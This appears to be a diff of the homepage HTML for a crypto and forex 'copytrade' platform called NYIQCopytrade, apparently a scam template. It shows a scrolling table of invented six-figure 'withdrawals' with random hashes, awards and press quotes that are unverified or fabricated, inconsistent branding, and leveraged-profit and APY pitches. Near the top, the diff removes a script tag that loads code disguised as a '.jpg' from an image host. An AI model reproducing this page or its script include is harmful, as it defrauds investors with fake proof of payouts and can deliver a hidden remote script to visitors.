+            "s": "FX:USDJPY",
+            "d": "USD to JPY"
+          },
+          {
+            "s": "FX:USDCHF",
+            "d": "USD to CHF"
+          },
+          {
+            "s": "FX:AUDUSD",
+            "d": "AUD to USD"
+          },
+          {
+            "s": "FX:USDCAD",
+            "d": "USD to CAD"
+          }
+        ],
+        "originalTitle": "Forex"
+      }
+    ]
+  }
     </script>
-    <script src="https://iili.io/JRKigR4.md.jpg" defer="defer"></script>
-  </body>
+  </div>
+  <!-- TradingView Widget END -->
+            <!-- TradingView Widget END -->
+
+
+    </div>
+    </section>
+    </div>
+
+    <!-- TradingView Widget BEGIN -->
+<div class="tradingview-widget-container">
+    <div class="tradingview-widget-container__widget"></div>
+    <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Track all markets on TradingView</span></a></div>
+    <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-forex-cross-rates.js" async>
+    {
+    "width": "100%",
+    "height": 400,
+    "currencies": [
+      "EUR",
+      "USD",
+      "JPY",
+      "GBP",
+      "CHF",
+      "AUD",
+      "CAD",
+      "NZD"
+    ],
+    "isTransparent": true,
+    "colorTheme": "light",
+    "locale": "en"
+  }
+    </script>
+  </div>
+  <!-- TradingView Widget END -->
+    <!-- TradingView Widget END -->
+
+    <div class="assets-button__container assets-button__container-after-table">
+        <a class="btn btn--filled index-action assets-section__action btn--description btn--fullsized"
+            href="id/sign-up.html">Open free account</a>
+        <div class="prs-text prs-text-comment">
+            Quick registration. Start trading in minutes!
+        </div>
+    </div>
+    <section class="platform-description-section prs-container">
+        <div class="prs-title platform-description-section__title">
+            NYIQCopytrade trading platform
+        </div>
+        <div class="prs-text platform-description-section__description">
+            Be one step ahead and Improve your trading results with our
+            industry-leading technology.
+        </div>
+        <div class="awards__items black">
+            <div class="awards__item">
+                <img class="awards__item-img" src="assets/images/awards/best-broker.svg" alt="best broker" width="72"
+                    height="72" />
+                <div class="awards__item-title">Best Crypto and Forex Broker</div>
+                <div class="awards__item-description">Forex Awards</div>
+            </div>
+            <div class="awards__item">
+                <img class="awards__item-img" src="assets/images/awards/best-platformfa64.svg" alt="best platform"
+                    width="72" height="72" />
+                <div class="awards__item-title">Best Platform for Margin Trading</div>
+                <div class="awards__item-description">
+                    ADVFN International Financial Awards
+                </div>
+            </div>
+            <div class="awards__item">
+                <img class="awards__item-img" src="assets/images/awards/best-broker86c5.svg" alt="best broker"
+                    width="72" height="72" />
+                <div class="awards__item-title">Best Crypto Trading App</div>
+                <div class="awards__item-description">Forex Awards</div>
+            </div>
+        </div>
+        <img class="platform-description-section__img" src="assets/images/platform-description96b8.png"
+            alt="devices image" width="1264" height="489" />
+        <div class="platform-description-items">
+            <div class="platform-description-item">
+                <div class="platform-description-value">&lt; 7.12 ms</div>
+                <div class="platform-description-message prs-text">
+                    Average order execution speed
+                </div>
+            </div>
+            <div class="platform-description-item">
+                <div class="platform-description-value">12+</div>
+                <div class="platform-description-message prs-text">
+                    Integrated liquidity providers
+                </div>
+            </div>
+            <div class="platform-description-item">
+                <div class="platform-description-value">&gt; 12,000</div>
+                <div class="platform-description-message prs-text">
+                    Executed orders per second
+                </div>
+            </div>
+            <div class="platform-description-item">
+                <div class="platform-description-value">$545,000,000</div>
+                <div class="platform-description-message prs-text">
+                    Average trading volume per day
+                </div>
+            </div>
+        </div>
+        <div class="platform-button-container btn--fullsized-container btn--description">
+            <a class="btn btn--filled btn--fullsized" href="id/sign-up.html">Setup your trading account</a><a
+                class="btn btn--fullsized" href="platform.html">Discover our platform</a>
+        </div>
+        <div class="prs-text prs-text-comment">
+            Registration takes only 40 seconds!
+        </div>
+    </section>
+    <section>
+        <div class="advantages">
+            <div class="advantages__wrapper prs-container">
+                <div class="advantages__header prs-title cov">
+                    Copy leading traders with Covesting Copy-trading Module
+                </div>
+                <div class="advantages__blocks cov">
+                    <div class="advantages__list">
+                        <ul class="advantages__ul cov">
+                            <li class="advantages__item cov">
+                                <div class="advantages__item-header">New to trading?</div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    Choose among best performing strategies and automatically
+                                    copy their trading activity to get the same returns!
+                                </div>
+                            </li>
+                            <li class="advantages__item cov">
+                                <div class="advantages__item-header">Experienced trader?</div>
+                                <div class="advantages__item-text prs-text prs-text-bullet">
+                                    Make additional income with Covesting
+                                    <a class="prm-link" href="copy-trading.html">Copy-trading Module</a>
+                                    . Earn up to 20% of all profits earned for your followers!
+                                </div>
+                            </li>
+                        </ul>
+                        <div class="advantages__button advantages__button_pc">
+                            <a class="btn btn--filled index-action btn--fullsized btn--description"
+                                href="covesting.html">Learn more</a>
+                        </div>
+                    </div>
+                    <div class="advantages__image cov">
+                        <div class="advantages__img cov"></div>
+                    </div>
+                    <div class="advantages__button advantages__button_mobile">
+                        <a class="btn btn--filled index-action btn--fullsized btn--description"
+                            href="covesting.html">Learn more</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section>
+        <div class="advantages">
+            <div class="advantages__wrapper prs-container">
+                <div class="advantages__header prs-title yield">
+                    Earn interest on your crypto
+                </div>
+                <div class="advantages__blocks yield">
+                    <div class="advantages__list">
+                        <ul class="advantages__ul yield">
+                            <li class="advantages__item yield">
+                                <div class="advantages__item-header">Passive income</div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    Start earning up to <b>14% APY</b> on the most popular
+                                    crypto assets.
+                                </div>
+                            </li>
+                            <li class="advantages__item yield">
+                                <div class="advantages__item-header">Easy to start</div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    We make things simple. No technical knowledge is needed to
+                                    start earning interest.
+                                </div>
+                            </li>
+                            <li class="advantages__item yield">
+                                <div class="advantages__item-header">Full control</div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    Your assets are never locked. Add or withdraw funds at any
+                                    time.
+                                </div>
+                            </li>
+                        </ul>
+                        <div class="advantages__button">
+                            <a class="btn btn--filled index-action btn--fullsized btn--description"
+                                href="yield.html">Learn more</a>
+                        </div>
+                    </div>
+                    <div class="advantages__image yield">
+                        <div class="advantages__img yield"></div>
+                    </div>
+                    <div class="advantages__button advantages__button_mobile">
+                        <a class="btn btn--filled index-action btn--fullsized btn--description" href="yield.html">Learn
+                            more</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="advantages-section prs-container prs-container--dark-bg">
+        <div class="prs-title advantages-section__title">Why us?</div>
+        <div class="cards__boxes">
+            <div class="card-box">
+                <img class="card-box__icon card-box__icon_account-setup" src="assets/icons/account-setupabf8.svg"
+                    alt="Trade with the best" width="72" height="72" />
+                <p class="card-box__title">Trade with the best</p>
+                <div class="card-box__desc">
+                    NYIQCopytrade has received multiple international awards for
+                    providing superior online trading services globally
+                </div>
+                <a class="prs-link card-box__action" href="id/sign-up.html">Start trading</a>
+            </div>
+            <div class="card-box">
+                <img class="card-box__icon card-box__icon_deposit-and-withdrawal"
+                    src="assets/icons/deposit-and-withdrawalsc07e.svg" alt="Find new opportunities" width="72"
+                    height="72" />
+                <p class="card-box__title">Find new opportunities</p>
+                <div class="card-box__desc">
+                    We provide our clients with the most innovative products and access
+                    to a wide range of markets
+                </div>
+                <a class="prs-link card-box__action" href="leverage-trading-crypto-indices-forex.html">See all
+                    markets</a>
+            </div>
+            <div class="card-box">
+                <img class="card-box__icon card-box__icon_leverage-trading" src="assets/icons/leverage-trading6d41.svg"
+                    alt="Increase profitability" width="72" height="72" />
+                <p class="card-box__title">Increase profitability</p>
+                <div class="card-box__desc">
+                    Benefit from low fees, fast order execution, and advanced platform
+                    features to increase your profitability
+                </div>
+                <a class="prs-link card-box__action" href="id/sign-up.html">Open free account</a>
+            </div>
+            <div class="card-box">
+                <img class="card-box__icon card-box__icon_security" src="assets/icons/security0a24.svg"
+                    alt="Enjoy privacy and security" width="72" height="72" />
+                <p class="card-box__title">Enjoy privacy and security</p>
+                <div class="card-box__desc">
+                    Our platform is designed to protect funds and personal data better.
+                    Your privacy always comes first
+                </div>
+                <a class="prs-link card-box__action" href="index.html">Learn more</a>
+            </div>
+        </div>
+    </section>
+    <section>
+        <div class="trade">
+            <div class="trade__wrapper prs-container">
+                <div class="trade__blocks">
+                    <div class="trade__title">
+                        <h2 class="trade__header prs-title">
+                            Maximize profits with leverage
+                        </h2>
+                        <div class="trade__description">
+                            <p>
+                                Improve your trading results by using leverage (margin).
+                                Leverage is a powerful tool that allows you to open a position
+                                much larger in value than the amount you deposited<a class="prs-link trade__learn-more"
+                                    href="trade-bitcoin-with-leverage.html">Learn more</a>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="trade__second-container">
+                        <div class="trade__image">
+                            <img class="trade__img" src="assets/images/trade74c6.svg" alt="BTC/USD trade example"
+                                width="100%" height="100%" />
+                        </div>
+                        <div class="trade__info">
+                            <p class="trade__decorated-text">
+                                If an asset increased from $7,000 to $7,045 your return would
+                                be equal to:
+                            </p>
+                            <div class="trade__numbers">
+                                <div class="trade__number-item">
+                                    <div class="trade__percent">+0.64%</div>
+                                    <div class="trade__percent-description">
+                                        without leverage
+                                    </div>
+                                </div>
+                                <div class="trade__number-item">
+                                    <div class="trade__percent">+12.8%</div>
+                                    <div class="trade__percent-description">
+                                        with 1:20 leverage
+                                    </div>
+                                </div>
+                                <div class="trade__number-item">
+                                    <div class="trade__percent">+32%</div>
+                                    <div class="trade__percent-description">
+                                        with 1:50 leverage
+                                    </div>
+                                </div>
+                                <div class="trade__number-item">
+                                    <div class="trade__percent trade__percent--colored">
+                                        +64%
+                                    </div>
+                                    <div class="trade__percent-description">
+                                        with 1:100 leverage
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="trade__buttons trade__buttons-left">
+                                <a class="trade__start btn btn--description btn--fullsized" href="id/sign-up.html">Get
+                                    started</a>
+                                <div class="prs-text prs-text-comment">
+                                    Margin trading involves risk.
+                                    <a class="prm-link" href="index.html">
+                                        See Risk Disclosure</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="trade__percent--colored">
+        <div class="profit">
+            <div class="profit__wrapper container">
+                <h2 class="profit__header">Trade when markets go up &amp; down</h2>
+                <div class="profit__charts">
+                    <div class="profit__text">
+                        <div class="profit__description">
+                            Respond quickly to changing market trends and profit from both
+                            rising and falling prices. Go Long and Short on our secure and
+                            reliable platform.<a class="prs-link profit__learn-more"
+                                href="trade-bitcoin-long-and-short.html">Learn more</a>
+                        </div>
+                        <div class="profit__buttons profit__buttons--hide-mobile">
+                            <a class="btn index-action" href="id/sign-up.html">Start trading</a>
+                        </div>
+                    </div>
+                    <div class="profit__chart profit__chart--higher">
+                        <div class="profit__chart-header">Market price goes higher</div>
+                        <div class="profit__chart-img">
+                            <img src="assets/images/higher-chart9902.svg" alt="Market price goes higher" width="100%"
+                                height="100%" />
+                        </div>
+                    </div>
+                    <div class="profit__chart profit__chart--lower">
+                        <div class="profit__chart-header">Market price goes lower</div>
+                        <div class="profit__chart-img">
+                            <img src="assets/images/lower-chartc5c5.svg" alt="Market price goes lower" width="100%"
+                                height="100%" />
+                        </div>
+                    </div>
+                    <div class="profit__buttons profit__buttons--show-mobile">
+                        <a class="btn index-action" href="id/sign-up.html">Start trading</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section>
+        <div class="advantages">
+            <div class="advantages__wrapper prs-container">
+                <div class="advantages__header prs-title open">
+                    Open a free account and start trading in minutes!
+                </div>
+                <div class="advantages__description advantages__description-first">
+                    We provide our clients with a wide range of trading tools and
+                    features to improve their trading results
+                </div>
+                <div class="advantages__blocks open">
+                    <div class="advantages__list">
+                        <ul class="advantages__ul open">
+                            <li class="advantages__item open">
+                                <div class="advantages__item-header">
+                                    Best-in-class platform
+                                </div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    Become a better trader with advanced trading tools. Artificial Intelligence
+                                    Exchange provides an award-winning platform that is used by
+                                    traders from around the world.
+                                </div>
+                            </li>
+                            <li class="advantages__item open">
+                                <div class="advantages__item-header">Global markets</div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    NYIQCopytrade allows its users to access multiple markets
+                                    from a single account. Trade Cryptocurrencies, Forex,
+                                    Commodities, and much more.
+                                </div>
+                            </li>
+                            <li class="advantages__item open">
+                                <div class="advantages__item-header">24/7 support</div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    Our customer service team works 24/7 to provide you with an
+                                    exceptional level of support.
+                                </div>
+                            </li>
+                            <li class="advantages__item open">
+                                <div class="advantages__item-header">Low fees</div>
+                                <div class="advantages__item-text prs-text-bullet">
+                                    Save on trading fees and benefits from the most competitive
+                                    trading conditions in the market.
+                                </div>
+                            </li>
+                        </ul>
+                        <div class="advantages__button">
+                            <a class="btn btn--filled index-action btn--fullsized btn--description"
+                                href="id/sign-up.html">Open account</a>
+                            <div class="prs-text prs-text-comment">
+                                Registration takes only 40 seconds!
+                            </div>
+                        </div>
+                    </div>
+                    <div class="advantages__image open">
+                        <div class="advantages__img open"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- TradingView Widget BEGIN -->
+    <div class="tradingview-widget-container">
+        <div class="tradingview-widget-container__widget"></div>
+        <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Track all markets on TradingView</span></a></div>
+        <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-screener.js" async>
+        {
+        "width": "100%",
+        "height": "490",
+        "defaultColumn": "overview",
+        "screener_type": "crypto_mkt",
+        "displayCurrency": "USD",
+        "colorTheme": "light",
+        "locale": "en",
+        "isTransparent": true
+    }
+        </script>
+    </div>
+  <!-- TradingView Widget END -->
+
+    <center>
+        <div class="container" ">
+            <div class=" section-head text-center">
+            <br /><br /><br /><br />
+            <span class="wt-title-subline font-16 text-gray-dark m-b15"></span>
+            <h2 class="text-uppercase">Withdrawals</h2>
+
+            <div class="table-responsive" style="height: 400px; overflow-y: auto; overflow-x: auto">
+                <marquee direction="down" height="100%">
+                    <table class="table" style="width: 100%">
+                        <thead>
+                            <tr>
+                                <th class="text-center">Status</th>
+                                <th class="text-center">Amount(USD)</th>
+                                <th class="text-center">Wallet</th>
+                            </tr>
+                        </thead>
+                                                <tbody>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$345,000.00</td>
+                        <td class="text-center">5db755bffa18e68074a89ff5f0c8201640e72100a3c94ee8eaa548da5d212179</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$234,000.00</td>
+                        <td class="text-center">9416423cd7df142408fbfffb1330392d593f4bb3f4a8f798affd84f9e9ff3436</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$264,000.00</td>
+                        <td class="text-center">c167fdc888d4473af57d262e807c6ad211e63fc497bc579f109cb8b90b0137f4</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Pending                                </td>
+                                <td class="text-center">$462,000.00</td>
+                        <td class="text-center">ad7c15ae06424ec1636d062a30f83f5f5a8d681457838732253df9a849d3d912</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$63,000.00</td>
+                        <td class="text-center">6ad88fd931c6d20d33b6516673f6fb1f3a2a0281fc636e3e693afd36e954db26</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$450,000.00</td>
+                        <td class="text-center">f2bf68b923ab9fe88d1fa1b3c9fc1957b9cdf2f98d8075f157f92e581371ab1b</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$303,000.00</td>
+                        <td class="text-center">48d12bf29075a6933638c292846b779a506bb568008213a9d947d92e72690d1a</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$279,000.00</td>
+                        <td class="text-center">e7f20c66061846c4edae5289a6bf7a07d16688522dcaf3ba0a7a96f2e7971fd0</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$432,000.00</td>
+                        <td class="text-center">e2fd33c024267590fb815d68b8e0b44e97a84e8126c6c10e3de78b995ae591c8</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Pending                                </td>
+                                <td class="text-center">$510,000.00</td>
+                        <td class="text-center">d4b0fc7897fae96f74e8ec6ab129671e0ba84471d8389f1648cfe85582d05de2</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$345,000.00</td>
+                        <td class="text-center">11f0db353290c7caf2f1fdae45a75fc6fe63b0d9789b5846053f3352aeac067b</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$294,000.00</td>
+                        <td class="text-center">caf0f631d573822e9a4c46787e38f918a6859dfbc519773950f0e2df90785d86</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Pending                                </td>
+                                <td class="text-center">$249,000.00</td>
+                        <td class="text-center">61b5e260df1123a2b6a554aaf075b1df4ca53fc01da4fd3fd376aa409f84ed5d</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$264,000.00</td>
+                        <td class="text-center">60dd8276d9e85ad4fae4c8ab462510783d76969b9da1f1c487cc659b59c34486</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$237,000.00</td>
+                        <td class="text-center">67a7e9a97cb9021ed9950c97e9854a72d2bede2ac8d97021e313139e0dee5864</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$102,000.00</td>
+                        <td class="text-center">e38407ed15ea10329185d05b45ddf63d5e7841d5180c6087d4441ed94740004e</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$42,000.00</td>
+                        <td class="text-center">edfa1275e0976afc85fc253efd816bd046560eabb102d5d48d535c12e8c8f5a6</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$51,000.00</td>
+                        <td class="text-center">62a57d805dfae8fc514c7c1e4ea670b000ce77bb5fb1a55b764afe187ae2f096</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$141,000.00</td>
+                        <td class="text-center">7f58bc7d9017393604e6375caa7bf2a324ebef2c0909b0f522218111daa76e14</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$345,000.00</td>
+                        <td class="text-center">15d8216875259940e3d827a58efe164d1c340029b9e41aefd3f78216ff004d51</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$408,000.00</td>
+                        <td class="text-center">54d9bc6bdb4f665a4a0891368543e089c1eaa374d798af615b71c1a1699ad5e7</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$480,000.00</td>
+                        <td class="text-center">c2a04685925c7e8f1f2a87021a592a1e2c68845c416fd26f390fa7ad0edc7ebb</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$528,000.00</td>
+                        <td class="text-center">5ab8ba91a3a26dff8a46ba2a23520ea632e6a0f49724835d8b61f85d8b52763b</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$186,000.00</td>
+                        <td class="text-center">926f143be090ca197b3f367cc56589fa014eedcf5fdf9de6f3ccc01bc6362303</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$411,000.00</td>
+                        <td class="text-center">00af34f18b5062e2e0c9b42b0c80b74f5ecec21a72c52e97a4b481ae6d093c05</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$168,000.00</td>
+                        <td class="text-center">9feab89257ea597d1709b40f201149db31b613e9a7c9fb3e62843b6e16fe45a3</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$522,000.00</td>
+                        <td class="text-center">3f7a7362cb0187d4855eb10879e8d94be996c13cdba1e73eb4e4116251cc20d0</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$294,000.00</td>
+                        <td class="text-center">02c46018a113a33d5d57b188add57d8ced93665506f7bca0f24235d1b026bf9f</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Pending                                </td>
+                                <td class="text-center">$99,000.00</td>
+                        <td class="text-center">ddbcd4c90ad46a17fc7561a6f75881d339d3a51dd0869502d7641206d8bfb05e</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Pending                                </td>
+                                <td class="text-center">$507,000.00</td>
+                        <td class="text-center">3881d570244c016d26a4e53f3ef3e2efbdd1cf05a8931a9c987ba7dc3a71c8f1</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$393,000.00</td>
+                        <td class="text-center">f99286f2376ee93b3e98121782966fd4f082049614e496b7cab9a6d968333aea</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$561,000.00</td>
+                        <td class="text-center">d135c8bc24055830d8d1ab632439cb8d8bfad4e746b5406da6999e26263032a5</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Pending                                </td>
+                                <td class="text-center">$597,000.00</td>
+                        <td class="text-center">933b6e94c8266e82c9620f9ae419b520189149b7c20120e41395b22e8075e3f7</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$369,000.00</td>
+                        <td class="text-center">83b7091be03f12b56716e47b599e9012262679a658fdb47329670c0561be4ece</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$294,000.00</td>
+                        <td class="text-center">9208338637e4f86d784f91f7af847e73dd39440eae368df1021b158257c151f8</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <i class="fa fa-check"></i>Confirmed                                </td>
+                                <td class="text-center">$33,000.00</td>
+                        <td class="text-center">13f341ed8569e5d55a7ccdeebfe8cfb3b1ae9da681a744fc67f80cdcabcc4b9b</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-check"></i></span>Confirmed                                </td>
+                                <td class="text-center">$570,000.00</td>
+                        <td class="text-center">1e890779baf94650e0fd10fb9d72195a4a33cfa2c3b44b0614bb52681b6d963f</td>                            </tr>
+                            <tr>
+                                <td class="text-center">
+                                    <span class="btn-label"><i class="fa fa-warning"></i></span>Confirmed                                </td>
+                                <td class="text-center">$363,000.00</td>
+                        <td class="text-center">3186c53d7854f3b1fc75d39f05920ccd374837da26c6756a906431a0fccfba8d</td>                            </tr>
+                        </tbody>
+                    </table>
+                </marquee>
+            </div>
+        </div>
+        </div>
+    </center>
+
+    <section class="prs-container prs-container--dark-bg media-section">
+        <div class="prs-title media-section__title">
+            NYIQCopytrade in the Media
+        </div>
+        <div class="glide">
+            <div class="glide__track" data-glide-el="track">
+                <ul class="glide__slides media-section__messages">
+                    <li class="media-section__message-wrapper" data-index="0">
+                        <div class="media-section__message">
+                            <div class="media-section__message-text prs-text">
+                                <span
+                                    class="media-section__message-quote media-section__message-quote_top">“</span>Artificial
+                                Intelligence Exchange's products and services are designed to meet
+                                the needs of both new and professional traders...<span
+                                    class="media-section__message-quote media-section__message-quote_bottom">“</span>
+                            </div>
+                            <div class="media-section__message-logo media-section__message-logo_business-insider"></div>
+                        </div>
+                    </li>
+                    <li class="media-section__message-wrapper" data-index="1">
+                        <div class="media-section__message">
+                            <div class="media-section__message-text prs-text">
+                                <span
+                                    class="media-section__message-quote media-section__message-quote_top">“</span>Artificial
+                                Intelligence Exchange Crushes All Competition. Platform offers the
+                                most leverage available anywhere in the crypto space<span
+                                    class="media-section__message-quote media-section__message-quote_bottom">“</span>
+                            </div>
+                            <div class="media-section__message-logo media-section__message-logo_amb-crypto"></div>
+                        </div>
+                    </li>
+                    <li class="media-section__message-wrapper" data-index="2">
+                        <div class="media-section__message">
+                            <div class="media-section__message-text prs-text">
+                                <span class="media-section__message-quote media-section__message-quote_top">“</span>Most
+                                importantly, NYIQCopytrade employs the best and most
+                                advanced security practices available in the industry
+                                today.<span
+                                    class="media-section__message-quote media-section__message-quote_bottom">“</span>
+                            </div>
+                            <div class="media-section__message-logo media-section__message-logo_market-watch"></div>
+                        </div>
+                    </li>
+                    <li class="media-section__message-wrapper" data-index="3">
+                        <div class="media-section__message">
+                            <div class="media-section__message-text prs-text">
+                                <span
+                                    class="media-section__message-quote media-section__message-quote_top">“</span>Artificial
+                                Intelligence Exchange addresses problems like low liquidity,
+                                inability to earn from falling markets, unexpected down-times,
+                                high trading fees, and poor UI.<span
+                                    class="media-section__message-quote media-section__message-quote_bottom">“</span>
+                            </div>
+                            <div class="media-section__message-logo media-section__message-logo_yahoo-finance"></div>
+                        </div>
+                    </li>
+                    <li class="media-section__message-wrapper" data-index="4">
+                        <div class="media-section__message">
+                            <div class="media-section__message-text prs-text">
+                                <span
+                                    class="media-section__message-quote media-section__message-quote_top">“</span>Research
+                                shows that NYIQCopytrade boasts a number of
+                                features that BitMEX simply does not.<span
+                                    class="media-section__message-quote media-section__message-quote_bottom">“</span>
+                            </div>
+                            <div class="media-section__message-logo media-section__message-logo_ethereumworldnews">
+                            </div>
+                        </div>
+                    </li>
+                    <li class="media-section__message-wrapper" data-index="5">
+                        <div class="media-section__message">
+                            <div class="media-section__message-text prs-text">
+                                <span
+                                    class="media-section__message-quote media-section__message-quote_top">“</span>Crypto
+                                traders seeking a next-level experience owe it to
+                                themselves to give NYIQCopytrade a try.<span
+                                    class="media-section__message-quote media-section__message-quote_bottom">“</span>
+                            </div>
+                            <div class="media-section__message-logo media-section__message-logo_coin-codex"></div>
+                        </div>
+                    </li>
+                    <li class="media-section__message-wrapper" data-index="6">
+                        <div class="media-section__message">
+                            <div class="media-section__message-text prs-text">
+                                <span
+                                    class="media-section__message-quote media-section__message-quote_top">“</span>Artificial
+                                Intelligence Exchange is built on a foundation of decades of
+                                traditional market experience.<span
+                                    class="media-section__message-quote media-section__message-quote_bottom">“</span>
+                            </div>
+                            <div class="media-section__message-logo media-section__message-logo_bitcoin-exchange-guide">
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+                <div class="media-section__message-bullets" data-glide-el="controls[nav]">
+                    <button class="media-section__message-bullet" data-glide-dir="=0"
+                        aria-label="first slide"></button><button class="media-section__message-bullet"
+                        data-glide-dir="=1" aria-label="second slide"></button><button
+                        class="media-section__message-bullet" data-glide-dir="=2"
+                        aria-label="third slide"></button><button class="media-section__message-bullet"
+                        data-glide-dir="=3" aria-label="fourth slide"></button><button
+                        class="media-section__message-bullet" data-glide-dir="=4"
+                        aria-label="fifth slide"></button><button class="media-section__message-bullet"
+                        data-glide-dir="=5" aria-label="sixth slide"></button><button
+                        class="media-section__message-bullet" data-glide-dir="=6" aria-label="seventh slide"></button>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="mobiles prs-container">
+        <div class="mobiles__wrapper">
+            <div class="mobiles__left"></div>
+            <div class="mobiles__right">
+                <div class="prs-title mobiles__title">Trade anytime, anywhere</div>
+                <div class="prs-text mobiles__description">
+                    Trade global markets including Cryptocurrencies, Stock Indices,
+                    Commodities and Forex from your mobile device
+                </div>
